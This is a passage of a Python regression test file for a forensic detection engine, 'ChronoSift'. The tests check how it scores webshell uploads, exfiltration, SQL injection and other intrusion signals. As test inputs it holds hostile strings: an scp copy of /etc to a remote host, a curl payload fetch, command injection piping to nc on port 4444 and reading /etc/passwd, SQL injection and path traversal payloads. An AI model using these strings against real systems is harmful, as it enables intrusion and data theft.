"""
Regression checks for ChronoSift v2.31 config and backward compatibility.
"""
import importlib.util
import json
import pathlib
import sys
import tempfile
import unittest

import numpy as np
import pandas as pd


MODULE_PATH = pathlib.Path(__file__).resolve().parents[1] / "chronoSIFT_v2_31.py"
SPEC = importlib.util.spec_from_file_location("chronosift_v2_31_regression", MODULE_PATH)
MODULE = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = MODULE
SPEC.loader.exec_module(MODULE)
ChronoSiftEngine = MODULE.ChronoSiftEngine

RULES_PATH = "rules/rules_profiled_audited_nsrl_updates_baseline_yara_fixed_v10.yaml"
WEIGHTS_PATH = "rules/weights_profiled_audited_nsrl_updates_baseline_yara_fixed_v8.yaml"


class ChronoSiftV231RegressionTest(unittest.TestCase):
    def setUp(self):
        self.engine = ChronoSiftEngine.from_yaml(RULES_PATH, WEIGHTS_PATH)

    def _run_referenced_hit_propagation(self, hit_rows, target_rows, hit_manifest=None):
        all_rows = hit_rows + target_rows
        df = pd.DataFrame(
            all_rows,
            index=pd.to_datetime(
                [f"2024-06-16T21:{i:02d}:00Z" for i in range(len(all_rows))],
                utc=True,
            ),
        )
        signal_map = {}
        explain_map = {}
        self.engine._apply_referenced_file_hit_signals_sparse(
            df, signal_map, explain_map, hit_manifest=hit_manifest
        )
        return signal_map, explain_map

    def test_new_weights_exist(self):
        for signal_name in (
            "systemd_service_persistence",
            "authorized_keys_persistence",
            "webshell_activity",
            "inhibit_system_recovery",
            "ingress_tool_transfer",
            "ransomware_impact",
            "ransomware_extension_burst",
            "automated_exfiltration",
            "credential_dump_collection",
            "password_store_exfil_chain",
            "web_upload_execution_chain",
            "web_sqli_attempt",
            "web_sqli_response_anomaly",
            "web_sqli_probable_success",
            "web_confirmed_webshell_access",
            "web_external_sensitive_transfer",
            "mitre_t1190",
            "mitre_t1505_003",
            "mitre_t1105",
            "mitre_t1213_006",
        ):
            self.assertIn(signal_name, self.engine.weights)

    def test_legacy_rdp_success_still_works(self):
        ts = pd.to_datetime([pd.Timestamp("2024-06-16T15:00:00Z")], utc=True)
        df = pd.DataFrame([{
            "parser": "winevtx",
            "xml_string": "<Event><System><Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>4624</EventID><Channel>Security</Channel></System><EventData><Data Name='TargetUserName'>admin</Data><Data Name='LogonType'>10</Data><Data Name='IpAddress'>10.0.0.5</Data></EventData></Event>",
            "timestamp_desc": "Event Recorded",
            "chronosift_row_id": 0,
        }], index=ts)
        out = self.engine.apply_atomic(df)
        out = self.engine.apply_contextual(out)
        signals = out.iloc[0]["chronosift_signals"]
        self.assertGreater(float(signals.get("rdp_success", 0)), 0)

    def test_restore_datetime_index_stably_orders_duplicate_timestamps_by_row_id(self):
        df = pd.DataFrame({
            "datetime": pd.to_datetime([
                "2024-06-16T16:01:00Z",
                "2024-06-16T16:00:00Z",
                "2024-06-16T16:00:00Z",
            ], utc=True),
            "chronosift_row_id": [2, 1, 0],
            "marker": ["late", "middle", "early"],
        })
        restored = MODULE._restore_datetime_index(df)
        self.assertEqual(restored["chronosift_row_id"].tolist(), [0, 1, 2])
        self.assertEqual(restored["marker"].tolist(), ["early", "middle", "late"])

    def test_apply_atomic_stably_orders_duplicate_timestamp_rows_by_row_id(self):
        ts = pd.to_datetime([
            "2024-06-16T16:30:00Z",
            "2024-06-16T16:30:00Z",
            "2024-06-16T16:30:00Z",
        ], utc=True)
        df = pd.DataFrame([
            {
                "parser": "filestat",
                "filename": "/tmp/c",
                "display_name": "c",
                "relative_path": "/tmp/c",
                "timestamp_desc": "Content Modification Time",
                "chronosift_row_id": 2,
            },
            {
                "parser": "filestat",
                "filename": "/tmp/a",
                "display_name": "a",
                "relative_path": "/tmp/a",
                "timestamp_desc": "Content Modification Time",
                "chronosift_row_id": 0,
            },
            {
                "parser": "filestat",
                "filename": "/tmp/b",
                "display_name": "b",
                "relative_path": "/tmp/b",
                "timestamp_desc": "Content Modification Time",
                "chronosift_row_id": 1,
            },
        ], index=ts)
        out = self.engine.apply_atomic(df)
        self.assertEqual(out["chronosift_row_id"].tolist(), [0, 1, 2])

    def test_best_effort_file_path_vectorised_matches_scalar_reference(self):
        ts = pd.to_datetime([
            "2024-06-16T17:00:00Z",
            "2024-06-16T17:00:00Z",
            "2024-06-16T17:01:00Z",
            "2024-06-16T17:01:00Z",
        ], utc=True)
        df = pd.DataFrame([
            {
                "filename": None,
                "relative_path": '"/tmp//alpha.txt"',
                "display_name": None,
                "pathspec": None,
                "link_target": None,
            },
            {
                "filename": None,
                "relative_path": None,
                "display_name": None,
                "pathspec": r"C:\\Temp\\\\beta.exe",
                "link_target": None,
            },
            {
                "filename": "(/var/log/auth.log)",
                "relative_path": None,
                "display_name": None,
                "pathspec": None,
                "link_target": None,
            },
            {
                "filename": None,
                "relative_path": None,
                "display_name": None,
                "pathspec": None,
                "link_target": None,
            },
        ], index=ts)
        expected = [
            MODULE._best_effort_file_path_values(
                row.get("filename"),
                row.get("relative_path"),
                row.get("display_name"),
                row.get("pathspec"),
                row.get("link_target"),
            )
            for _, row in df.iterrows()
        ]
        actual = MODULE._best_effort_file_path_vectorised(df).tolist()
        self.assertEqual(actual, expected)

    def test_normalise_yara_match_count_series_matches_scalar_reference(self):
        series = pd.Series([
            None,
            float("nan"),
            ["alpha", None, "beta"],
            '["rule_a", "rule_b"]',
            "['rule_c']",
            "single_rule",
            7,
        ])
        expected = [MODULE.normalise_yara_match_count(value) for value in series.tolist()]
        actual = MODULE.normalise_yara_match_count_series(series).tolist()
        self.assertEqual(actual, expected)

    def test_normalise_ipv4_first_series_matches_scalar_reference(self):
        series = pd.Series([
            None,
            "",
            "no ip here",
            "client=10.0.0.5 user=alice",
            "http://192.168.1.8/index.html",
            "version 7.8.19.0 build",
        ])
        expected = [MODULE.normalise_ipv4_first(value) for value in series.tolist()]
        actual = MODULE.normalise_ipv4_first_series(series).tolist()
        self.assertEqual(actual, expected)

    def test_classify_command_name_mentions_detects_multiple_tool_classes(self):
        compiler, shell, network, archive = MODULE._classify_command_name_mentions(
            r'bash -lc "tar -czf /tmp/x.tgz /etc && scp /tmp/x.tgz host:/tmp/"'
        )
        self.assertEqual((compiler, shell, network, archive), (False, True, True, True))

        compiler, shell, network, archive = MODULE._classify_command_name_mentions(
            r"gcc -o dropper.exe dropper.c"
        )
        self.assertEqual((compiler, shell, network, archive), (True, False, False, False))

    def test_combined_command_text_array_joins_nonempty_parts_once_per_row(self):
        df = pd.DataFrame({
            "actor_cmd": [" powershell ", None, "  "],
            "command_line": ["Get-Process", "cmd.exe /c whoami", ""],
            "message": [" status ", " event only ", "message only"],
        })
        actual = MODULE._combined_command_text_array(df).tolist()
        self.assertEqual(
            actual,
            [
                "powershell Get-Process status",
                "cmd.exe /c whoami event only",
                "message only",
            ],
        )
        self.assertEqual(MODULE._combined_command_text_array(df).tolist(), actual)

    def test_normalise_coalesce_candidate_series_matches_scalar_reference(self):
        series = pd.Series([
            None,
            "  Alpha  ",
            "N/A",
            7,
            pd.NA,
            "  ",
            "Beta",
        ], dtype=object)
        expected = [MODULE.normalise_coalesce_value(value) for value in series.tolist()]
        actual = MODULE._normalise_coalesce_candidate_series(series).tolist()
        self.assertEqual(actual, expected)

    def test_compiled_normalise_explain_item_accepts_numpy_canonical_value_arrays(self):
        compiled_spec = importlib.util.find_spec("chronoSIFT_v2_31")
        if compiled_spec is None:
            self.skipTest("compiled chronoSIFT_v2_31 module not available")
        compiled = importlib.import_module("chronoSIFT_v2_31")
        if not str(getattr(compiled, "__file__", "")).endswith(".so"):
            self.skipTest("compiled chronoSIFT_v2_31 module not loaded")

        engine = compiled.ChronoSiftEngine.from_yaml(RULES_PATH, WEIGHTS_PATH)
        df = pd.DataFrame(
            [{"actor_principal": "Administrator", "src_ip": "10.0.0.5"}],
            index=pd.to_datetime(["2024-06-16T17:15:00Z"], utc=True),
        )
        signal_map = {0: {"privileged_login": 1.0}}
        out = engine._normalise_explain_item(
            {
                "rule_id": "PRIV_LOGIN",
                "file_size": "53034000.0",
                "evidence": {"file_size": "53034000.0"},
            },
            0,
            df,
            signal_map,
            canonical_actor_values=np.array(["Administrator"], dtype=object),
            canonical_src_ip_values=np.array(["10.0.0.5"], dtype=object),
        )

        self.assertEqual(out["canonical_actor"], "Administrator")
        self.assertEqual(out["canonical_src_ip"], "10.0.0.5")
        self.assertEqual(out["file_size"], 53034000)
        self.assertEqual(out["evidence"]["file_size"], 53034000)

    def test_write_parquet_subchunk_keeps_nested_explain_when_file_size_types_mix(self):
        df = pd.DataFrame(
            [{"actor_principal": "Administrator", "src_ip": "10.0.0.5"}],
            index=pd.to_datetime(["2024-06-16T17:15:00Z"], utc=True),
        )
        signal_map = {0: {"archive_created": 1.0}}
        explain_rows = [
            self.engine._normalise_explain_item(
                {
                    "rule_id": "ARCHIVE_CREATED",
                    "file_size": 48516.0,
                    "evidence": {"path": r"C:\Temp\alpha.zip", "file_size": 48516.0},
                },
                0,
                df,
                signal_map,
            ),
            self.engine._normalise_explain_item(
                {
                    "rule_id": "LARGE_ARCHIVE_CREATED",
                    "file_size": "53034000.0",
                    "evidence": {"path": r"C:\Temp\beta.zip", "file_size": "53034000.0"},
                },
                0,
                df,
                signal_map,
            ),
        ]
        self.assertEqual(explain_rows[0]["file_size"], 48516)
        self.assertEqual(explain_rows[0]["evidence"]["file_size"], 48516)
        self.assertEqual(explain_rows[1]["file_size"], 53034000)
        self.assertEqual(explain_rows[1]["evidence"]["file_size"], 53034000)

        subchunk = pd.DataFrame({
            "chronosift_explain": [[explain_rows[0]], [explain_rows[1]]],
            "chronosift_score": [1.0, 2.0],
        })

        with tempfile.TemporaryDirectory() as tmpdir:
            outfile = pathlib.Path(tmpdir) / "part.parquet"
            mode = MODULE._write_parquet_subchunk(
                subchunk,
                outfile,
                {"engine": "pyarrow", "index": False},
                nested_columns_encoding="arrow",
            )

        self.assertEqual(mode, "nested")

    def test_http_request_semantics_and_upload_name_cached_helpers_preserve_behavior(self):
        semantics = MODULE._extract_http_request_semantics(
            "cs-method=POST cs-uri-stem=/upload.php cs-uri-query=file=shell.php"
        )
        upload_name = MODULE._extract_http_upload_name(
            "POST /upload.php?file=shell.php HTTP/1.1",
            "/upload.php?file=shell.php",
        )

        self.assertEqual(semantics.get("method"), "POST")
        self.assertEqual(semantics.get("path"), "/upload.php?file=shell.php")
        self.assertEqual(upload_name, "shell.php")

    def test_file_lifecycle_signals_support_vectorised_pathspec_coalesce(self):
        ts = pd.to_datetime(["2024-06-16T17:30:00Z"], utc=True)
        df = pd.DataFrame([{
            "parser": "filestat",
            "timestamp_desc": "Creation Time",
            "pathspec": "/var/www/html/shell.php",
            "hostname": "web1",
        }], index=ts)
        signal_map = {}
        explain_map = {}

        self.engine._apply_file_lifecycle_signals_sparse(df, signal_map, explain_map)

        self.assertIn(0, signal_map)
        self.assertGreater(float(signal_map[0].get("file_created", 0.0)), 0.0)
        self.assertGreater(float(signal_map[0].get("web_executable_file_created", 0.0)), 0.0)

    def test_partition_contextual_mode_omits_only_zero_weight_generic_lifecycle_payloads(self):
        ts = pd.to_datetime(["2024-06-16T17:30:00Z", "2024-06-16T17:31:00Z"], utc=True)
        df = pd.DataFrame([
            {
                "parser": "filestat",
                "timestamp_desc": "Creation Time",
                "pathspec": "/home/user/ordinary.txt",
            },
            {
                "parser": "filestat",
                "timestamp_desc": "Creation Time",
                "pathspec": "/var/www/html/shell.php",
            },
        ], index=ts)
        signal_map = {}
        explain_map = {}

        self.engine._apply_non_temporal_contextual_sparse(
            df,
            signal_map,
            explain_map,
            apply_profiling=False,
            retain_zero_weight_lifecycle_signals=False,
        )

        self.assertNotIn("file_created", signal_map.get(0, {}))
        self.assertNotIn("file_created", signal_map.get(1, {}))
        self.assertEqual(signal_map[1].get("web_executable_file_created"), 1.0)
        self.assertFalse(any(item.get("rule_id") == "FILE_CREATED" for items in explain_map.values() for item in items))

    def test_contextual_working_arrays_are_reused_without_dataframe_copy(self):
        ts = pd.to_datetime(["2024-06-16T17:30:00Z"], utc=True)
        df = pd.DataFrame([{"pathspec": r"C:\Temp\Payload.EXE"}], index=ts)
        cache = {}

        first = MODULE._contextual_path_lower(df, cache)
        second = MODULE._contextual_path_lower(df, cache)

        self.assertIs(first, second)
        self.assertEqual(first[0], "c:/temp/payload.exe")

    def test_persistence_config_signals_normalise_parser_and_timestamp_fields_once(self):
        ts = pd.to_datetime(["2024-06-16T17:31:00Z"], utc=True)
        df = pd.DataFrame([{
            "parser": " WINREG/WINDOWS_SERVICES ",
            "timestamp_desc": " Content Modification Time ",
            "hostname": " HOST01 ",
            "chronosift_row_id": 0,
        }], index=ts)
        signal_map = {}
        explain_map = {}

        self.engine._apply_persistence_and_config_signals_sparse(df, signal_map, explain_map)

        self.assertGreater(float(signal_map[0].get("service_configuration_changed", 0.0)), 0.0)
        self.assertEqual(explain_map[0][0]["evidence"]["parser"], "WINREG/WINDOWS_SERVICES")
        self.assertEqual(explain_map[0][0]["evidence"]["timestamp_desc"], "Content Modification Time")
        self.assertEqual(explain_map[0][0]["evidence"]["hostname"], "HOST01")

    def test_deadbox_direct_signals_normalise_authorized_keys_artifact_fields(self):
        ts = pd.to_datetime(["2024-06-16T17:32:00Z"], utc=True)
        df = pd.DataFrame([{
            "pathspec": " /ROOT/.SSH/AUTHORIZED_KEYS ",
            "timestamp_desc": " Creation Time ",
            "actor_principal": " ROOT ",
        }], index=ts)
        signal_map = {}
        explain_map = {}

        self.engine._apply_deadbox_direct_signals_sparse(df, signal_map, explain_map)

        self.assertGreater(float(signal_map[0].get("authorized_keys_root_persistence", 0.0)), 0.0)
        self.assertEqual(explain_map[0][0]["evidence"]["timestamp_desc"], "Creation Time")
        self.assertEqual(explain_map[0][0]["evidence"]["actor_user"], "root")

    def test_private_ip_continuity_uses_normalised_actor_and_ip_fields(self):
        original_cfg = self.engine.private_ip_continuity_cfg
        self.engine.private_ip_continuity_cfg = {
            "enabled": True,
            "key_by": ["actor_principal"],
            "lookback": "24h",
            "subnet_prefix_v4": 24,
            "subnet_prefix_v6": 64,
        }
        try:
            ts = pd.to_datetime(
                ["2024-06-16T17:33:00Z", "2024-06-16T17:43:00Z"],
                utc=True,
            )
            df = pd.DataFrame([
                {"actor_principal": " Alice ", "ip_address": " 10.0.0.5 "},
                {"actor_principal": "Alice", "ip_address": "10.0.1.8"},
            ], index=ts)
            signal_map = {}
            explain_map = {}

            self.engine._apply_private_ip_continuity_sparse(df, signal_map, explain_map, carried_last={})

            self.assertEqual(signal_map[1].get("user_changed_private_ip"), 1.0)
            self.assertEqual(signal_map[1].get("user_crossed_private_subnet"), 1.0)
            self.assertEqual(explain_map[1][0]["evidence"]["actor_principal"], "Alice")
            self.assertEqual(explain_map[1][0]["evidence"]["current_ip"], "10.0.1.8")
        finally:
            self.engine.private_ip_continuity_cfg = original_cfg

    def test_geo_continuity_uses_normalised_actor_key_fields(self):
        ts = pd.to_datetime(
            ["2024-06-16T17:34:00Z", "2024-06-16T18:34:00Z"],
            utc=True,
        )
        df = pd.DataFrame([
            {
                "actor_principal": " Alice ",
                "src_ip": "203.0.113.10",
                "geo_country_iso": " gb ",
                "geo_asn": "64500",
                "geo_city_name": "London",
            },
            {
                "actor_principal": "Alice",
                "src_ip": "198.51.100.44",
                "geo_country_iso": "DE",
                "geo_asn": "64501",
                "geo_city_name": "Berlin",
            },
        ], index=ts)
        signal_map = {
            0: {"auth_remote_success": 1.0},
            1: {"auth_remote_success": 1.0},
        }
        explain_map = {0: [], 1: []}

        self.engine._apply_geo_continuity_sparse(df, signal_map, explain_map, carried_state={})

        self.assertEqual(signal_map[1].get("new_country"), 1.0)
        self.assertEqual(signal_map[1].get("boundary_crossing"), 1.0)
        self.assertEqual(explain_map[1][0]["evidence"]["actor_key"], "Alice")

    def test_deadbox_temporal_composites_match_download_and_execution_with_normalised_names(self):
        ts = pd.to_datetime(
            ["2024-06-16T17:36:00Z", "2024-06-16T17:46:00Z"],
            utc=True,
        )
        df = pd.DataFrame([
            {"filename": " Payload.EXE "},
            {"filename": "payload.exe"},
        ], index=ts)
        signal_map = {
            0: {"browser_download": 1.0},
            1: {"suspicious_execution": 1.0},
        }
        explain_map = {0: [], 1: []}

        self.engine._apply_deadbox_temporal_composites_sparse(df, signal_map, explain_map)

        self.assertEqual(signal_map[1].get("user_execution_after_download"), 1.0)
        self.assertEqual(signal_map[1].get("ingress_tool_transfer"), 1.0)
        self.assertEqual(explain_map[1][0]["evidence"]["filename"], "payload.exe")

    def test_file_lifecycle_detects_database_dump_candidate_with_normalised_path_and_message(self):
        ts = pd.to_datetime(["2024-06-16T17:37:00Z"], utc=True)
        df = pd.DataFrame([{
            "pathspec": " /TMP/BACKUP.SQL ",
            "timestamp_desc": " Creation Time ",
            "message": " MYSQLDUMP completed ",
            "hostname": " HOST01 ",
            "parser": " FILESTAT ",
            "file_size": 4096,
            "is_allocated": True,
        }], index=ts)
        signal_map = {}
        explain_map = {}

        self.engine._apply_file_lifecycle_signals_sparse(df, signal_map, explain_map)

        self.assertGreater(float(signal_map[0].get("database_dump_candidate", 0.0)), 0.0)
        self.assertEqual(explain_map[0][1]["evidence"]["message"], "MYSQLDUMP completed")

    def test_execution_context_signals_use_normalised_path_command_and_actor_fields(self):
        ts = pd.to_datetime(["2024-06-16T17:38:00Z"], utc=True)
        df = pd.DataFrame([{
            "new_process_name": r" C:\Users\alice\AppData\Local\Temp\CMD.EXE ",
            "command_line": " CURL https://example.test/payload ",
            "actor_principal": " ROOT ",
        }], index=ts)
        signal_map = {}
        explain_map = {}

        self.engine._derive_execution_context_signals_sparse(df, signal_map, explain_map)

        self.assertGreater(float(signal_map[0].get("exec_from_tmp", 0.0)), 0.0)
        self.assertGreater(float(signal_map[0].get("exec_from_user_writable", 0.0)), 0.0)
        self.assertGreater(float(signal_map[0].get("exec_network_tool", 0.0)), 0.0)
        self.assertGreater(float(signal_map[0].get("exec_privileged_context", 0.0)), 0.0)
        self.assertEqual(explain_map[0][0]["evidence"]["actor_user"], "root")
        self.assertEqual(explain_map[0][0]["evidence"]["path"], r"C:\Users\alice\AppData\Local\Temp\CMD.EXE")

    def test_referenced_file_hit_propagates_via_direct_path_column(self):
        hit_rows = [{
            "filename": r"C:\Temp\exfil_tool.exe",
            "yara_match_count": 0,
            "av_hit": False,
            "luhn_hit": True,
            "message": "file entry",
        }]
        target_rows = [{
            "filename": "security.evtx",
            "message": "event 4688",
            "new_process_name": r"C:\Temp\exfil_tool.exe",
        }]
        signal_map, _ = self._run_referenced_hit_propagation(hit_rows, target_rows)
        sigs = signal_map.get(1, {})
        self.assertGreater(float(sigs.get("referenced_file_luhn_hit", 0.0)), 0.0)

    def test_referenced_file_hit_propagates_via_text_extraction_column(self):
        hit_rows = [{
            "filename": r"C:\Users\alice\Downloads\trojan.exe",
            "yara_match_count": 0,
            "av_hit": True,
            "luhn_hit": False,
            "message": "file entry",
        }]
        target_rows = [{
            "filename": "svchost.exe",
            "message": "process created",
            "command_line": r"cmd.exe /c C:\Users\alice\Downloads\trojan.exe --payload",
        }]
        signal_map, _ = self._run_referenced_hit_propagation(hit_rows, target_rows)
        sigs = signal_map.get(1, {})
        self.assertGreater(float(sigs.get("referenced_file_av_hit", 0.0)), 0.0)

    def test_web_path_canonicalisation_decodes_and_removes_query(self):
        self.assertEqual(
            MODULE._canonical_web_request_path("/exports/credit%20cards.sql?download=1#top"),
            "/exports/credit cards.sql",
        )
        self.assertEqual(
            MODULE._web_path_aliases_for_filesystem_path(
                "/var/www/html/exports/credit cards.sql",
                ("/var/www/html",),
            ),
            ("/exports/credit cards.sql",),
        )

    def test_strong_yara_gate_uses_score_quality_and_category(self):
        metadata = {
            "strong_shell": MODULE.YaraRuleMeta(score=90, quality=80, category=MODULE.YARA_CAT_WEBSHELL),
            "weak_shell": MODULE.YaraRuleMeta(score=60, quality=80, category=MODULE.YARA_CAT_WEBSHELL),
            "certificate": MODULE.YaraRuleMeta(score=100, quality=100, category=MODULE.YARA_CAT_CERTIFICATE),
        }
        cfg = {"web_yara_min_score": 75, "web_yara_min_quality": 70}
        self.assertTrue(MODULE._web_relevant_yara_rule_names(["strong_shell"], metadata, cfg))
        self.assertFalse(MODULE._web_relevant_yara_rule_names(["weak_shell"], metadata, cfg))
        self.assertFalse(MODULE._web_relevant_yara_rule_names(["certificate"], metadata, cfg))

    def test_manifest_web_aliases_exclude_yara_below_web_gate(self):
        manifest = MODULE._finalise_referenced_file_hit_manifest(
            {
                "/var/www/html/strong.php": {"yara"},
                "/var/www/html/routine.php": {"yara"},
                "/var/www/html/cards.csv": {"luhn"},
            },
            {},
            {"/var/www/html/strong.php"},
            {"web_document_roots": ["/var/www/html"]},
            {
                "/var/www/html/strong.php": {
                    "hit_types": {"yara"},
                    "yara_rules": {"strong_shell"},
                    "yara_categories": {MODULE.YARA_CAT_WEBSHELL},
                    "yara_rule_metadata": {
                        "strong_shell": {"category": MODULE.YARA_CAT_WEBSHELL, "score": 90, "quality": 80},
                    },
                },
            },
            {"B" * 64: {"/var/www/html/strong.php"}},
        )
        self.assertEqual(manifest["schema_version"], 4)
        self.assertEqual(manifest["web_path_map"]["/strong.php"], {"yara"})
        self.assertNotIn("/routine.php", manifest["web_path_map"])
        self.assertEqual(manifest["web_path_map"]["/cards.csv"], {"luhn"})
        identity = manifest["web_identity_map"]["/strong.php"]
        self.assertEqual(identity["yara_categories"], {MODULE.YARA_CAT_WEBSHELL})
        self.assertEqual(identity["yara_rule_metadata"]["strong_shell"]["quality"], 80)
        self.assertEqual(manifest["hash_hit_map"]["B" * 64], {"yara"})
        self.assertEqual(manifest["hash_identity_map"]["B" * 64]["yara_categories"], {MODULE.YARA_CAT_WEBSHELL})
        round_trip = MODULE._deserialise_file_hit_manifest(
            MODULE._serialise_file_hit_manifest(manifest)
        )
        self.assertEqual(round_trip, manifest)

    def test_successful_web_download_propagates_luhn_file_identity(self):
        manifest = {
            "hit_map": {"/var/www/html/includes/sqldump.sql": {"luhn"}},
            "basename_map": {"sqldump.sql": {"luhn"}},
            "web_path_map": {"/includes/sqldump.sql": {"luhn"}},
            "web_basename_map": {"sqldump.sql": {"luhn"}},
        }
        target_rows = [{
            "parser": "text/apache_access",
            "http_request": "GET /includes/sqldump.sql?download=1 HTTP/1.1",
            "http_response_code": 200,
            "http_response_bytes": 24000,
            "message": "download",
        }]
        signal_map, explain_map = self._run_referenced_hit_propagation([], target_rows, manifest)
        signals = signal_map[0]
        self.assertGreater(float(signals.get("referenced_file_luhn_hit", 0.0)), 0.0)
        self.assertEqual(signals.get("web_file_access"), 1.0)
        self.assertEqual(signals.get("web_sensitive_file_download"), 1.0)
        evidence = explain_map[0][-1]["evidence"]
        self.assertEqual(evidence["canonical_web_path"], "/includes/sqldump.sql")
        self.assertEqual(evidence["http_response_code"], 200)

    def test_failed_web_download_keeps_access_but_not_success_inference(self):
        manifest = {
            "hit_map": {},
            "basename_map": {},
            "web_path_map": {"/exports/customers.sql": {"luhn"}},
            "web_basename_map": {"customers.sql": {"luhn"}},
        }
        target_rows = [{
            "parser": "text/nginx_access",
            "http_request": "GET /exports/customers.sql HTTP/1.1",
            "http_response_code": 404,
        }]
        signal_map, _ = self._run_referenced_hit_propagation([], target_rows, manifest)
        self.assertEqual(signal_map[0].get("web_file_access"), 1.0)
        self.assertNotIn("web_sensitive_file_download", signal_map[0])

    def test_web_upload_name_propagates_strong_yara_file_identity(self):
        manifest = {
            "hit_map": {},
            "basename_map": {},
            "web_path_map": {"/shell.php": {"yara"}},
            "web_basename_map": {"shell.php": {"yara"}},
        }
        target_rows = [{
            "parser": "text/apache_access",
            "http_request": "POST /upload.php HTTP/1.1 filename=Shell.php",
            "http_response_code": 201,
        }]
        signal_map, _ = self._run_referenced_hit_propagation([], target_rows, manifest)
        signals = signal_map[0]
        self.assertGreater(float(signals.get("referenced_file_yara_hit", 0.0)), 0.0)
        self.assertEqual(signals.get("web_file_access"), 1.0)
        self.assertEqual(signals.get("web_malicious_file_upload"), 1.0)

    def test_structured_multipart_metadata_materialises_multiple_uploads(self):
        ts = pd.to_datetime(["2024-06-16T21:00:00Z"], utc=True)
        body = (
            '--x\r\nContent-Disposition: form-data; name="a"; filename="Report final.pdf"\r\n'
            'Content-Type: application/pdf\r\n\r\n...\r\n'
            '--x\r\nContent-Disposition: form-data; name="b"; '
            "filename*=UTF-8''cmd%2Ephp\r\nContent-Type: application/x-httpd-php\r\n"
        )
        df = pd.DataFrame([{
            "parser": "text/apache_access",
            "http_request": "POST /upload.php HTTP/1.1",
            "http_headers": "Content-Type: multipart/form-data; boundary=x",
            "request_body": body,
            "request_content_length": 12345,
            "http_response_code": 201,
        }], index=ts)

        out = self.engine.apply_atomic(df)
        row = out.iloc[0]
        self.assertEqual(row["chronosift_web_upload_name"], "cmd.php")
        self.assertEqual(set(row["chronosift_web_upload_names"].split("|")), {"cmd.php", "report final.pdf"})
        self.assertEqual(row["chronosift_web_upload_count"], 2)
        self.assertEqual(row["chronosift_web_request_body_bytes"], 12345)
        self.assertEqual(row["chronosift_web_upload_outcome"], "accepted")
        self.assertIn("application/x-httpd-php", row["chronosift_web_upload_content_types"])
        self.assertIn("executable_upload", row["chronosift_web_attack_indicators"])
        contextual = self.engine.apply_contextual(out, apply_temporal=False)
        self.assertEqual(contextual.iloc[0]["chronosift_signals"].get("exploit_public_facing_app"), 1.0)

    def test_upload_hash_correlation_is_preferred_and_t1105_requires_acceptance(self):
        file_hash = "A" * 64
        identity = {
            "hit_types": {"av"},
            "av_categories": {MODULE.AV_CAT_MALWARE},
            "av_families": {"ExampleFamily"},
        }
        manifest = {
            "schema_version": 3,
            "hit_map": {},
            "basename_map": {},
            "web_path_map": {},
            "web_basename_map": {},
            "hash_hit_map": {file_hash: {"av"}},
            "hash_identity_map": {file_hash: identity},
        }
        ts = pd.to_datetime(["2024-06-16T21:00:00Z", "2024-06-16T21:01:00Z"], utc=True)
        df = pd.DataFrame([
            {
                "parser": "text/apache_access",
                "http_request": "POST /upload.php HTTP/1.1",
                "upload_sha256": file_hash.lower(),
                "http_response_code": 201,
            },
            {
                "parser": "text/apache_access",
                "http_request": "POST /upload.php HTTP/1.1",
                "upload_sha256": file_hash.lower(),
                "http_response_code": 403,
            },
        ], index=ts)

        out = self.engine.apply_contextual(
            self.engine.apply_atomic(df), apply_temporal=False, file_hit_manifest=manifest
        )
        accepted = out.iloc[0]
        rejected = out.iloc[1]
        self.assertEqual(accepted["chronosift_web_upload_outcome"], "accepted")
        self.assertEqual(rejected["chronosift_web_upload_outcome"], "rejected")
        self.assertEqual(accepted["chronosift_signals"].get("web_malicious_file_upload"), 1.0)
        self.assertEqual(rejected["chronosift_signals"].get("web_malicious_file_upload"), 1.0)
        self.assertEqual(accepted["chronosift_signals"].get("mitre_t1105"), 1.0)
        self.assertNotIn("mitre_t1105", rejected["chronosift_signals"])
        self.assertIn("malware", accepted["chronosift_web_file_categories"])

    def test_web_atomic_rules_scope_on_plaso_parser(self):
        ts = pd.to_datetime(["2024-06-16T21:00:00Z"], utc=True)
        df = pd.DataFrame([{
            "parser": "text/apache_access",
            "http_request_user_agent": "sqlmap/1.8",
            "http_response_code": 200,
            "http_response_bytes": 12000000,
            "url": "/index.php?id=1",
        }], index=ts)
        out = self.engine.apply_atomic(df, materialise_event_columns=True)
        signals = out.iloc[0]["chronosift_signals"]
        self.assertEqual(signals.get("offensive_user_agent"), 1.0)
        self.assertEqual(signals.get("large_http_transfer"), 1.0)

    def test_sqli_detection_decodes_url_encoded_payloads(self):
        indicators = MODULE._http_sqli_indicators(
            "/search?id=1%27%20UNION%20ALL%20SELECT%20table_name%20FROM%20information_schema.tables--"
        )
        self.assertIn("union_select", indicators)
        self.assertIn("schema_enumeration", indicators)

    def test_web_indicators_ignore_ordinary_request_syntax(self):
        # Each of these was flagged before the indicators were tightened: the
        # query delimiter `&` was treated as a shell separator while `id`/`cat`
        # counted as command tokens, `+`-decoded prose satisfied the boolean
        # tautology shape, a lone `%2e` looked like traversal, and any absolute
        # URL parameter looked like remote file inclusion.
        for request_path in (
            "/index.php?option=com_content&view=article&id=5",
            "/dvwa/vulnerabilities/sqli/?id=3&Submit=Submit",
            "/media?type=video&id=12&cat=news",
            "/shop?cat=2&amp;id=7",
            "/search?q=cats+and+dogs=1",
            "/report?desc=Q1+revenue+and+cost=projected",
            "/img/logo%2Epng",
            "/redirect?url=https://partner.example.com/landing",
            "/oauth/callback?code=abc&state=xyz",
        ):
            self.assertEqual(
                MODULE._http_attack_indicators(request_path),
                tuple(),
                msg=f"benign request flagged: {request_path}",
            )

    def test_web_indicators_retain_genuine_exploitation_syntax(self):
        for request_path, expected in (
            ("/ping?host=127.0.0.1;cat%20/etc/passwd", "command_injection"),
            ("/ping?host=1%20%26%26%20whoami", "command_injection"),
            ("/x?y=%60id%60", "command_injection"),
            ("/x?y=$(uname%20-a)", "command_injection"),
            ("/x?y=1|nc%2010.0.0.1%204444", "command_injection"),
            ("/run?c=;/bin/sh", "command_injection"),
            ("/p?id=1%27%20OR%201=1--", "sqli:boolean_tautology"),
            ("/p?id=1 and 1=2", "sqli:boolean_tautology"),
            ("/p?id=a' or 'a'='a", "sqli:boolean_tautology"),
            # Numeric operand compared against a subquery or function call.
            ("/p?id=2 and 5577=(select 5577 from pg_sleep(5))--", "sqli:boolean_tautology"),
            ("/p?id=2 and 1644=cast((chr(113)) as int)", "sqli:boolean_tautology"),
            ("/p?id=(select concat(0x717a6a7171))", "sqli:inline_subquery"),
            ("/f?p=%2e%2e%2f%2e%2e%2fetc/passwd", "path_traversal"),
            ("/f?p=%252e%252e%252fetc", "path_traversal"),
